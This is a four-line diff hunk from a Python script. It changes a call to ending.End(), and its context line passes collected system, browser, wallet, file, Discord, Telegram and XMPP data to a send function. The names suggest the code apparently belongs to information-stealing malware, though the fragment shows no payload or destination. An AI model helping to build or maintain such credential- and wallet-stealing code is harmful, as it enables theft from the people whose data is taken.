@@ -92,4 +92,4 @@ try:
     send.Send(sendType,np,dataForMassageSYS,dataForMassageBrowsers,dataForMassageOther,dataForMassageWallets,dataForMassageFiles,discordData,TelegramData,xmppData)
 except Exception as e:
     print(e)
-ending.End()
+ending.End(np)
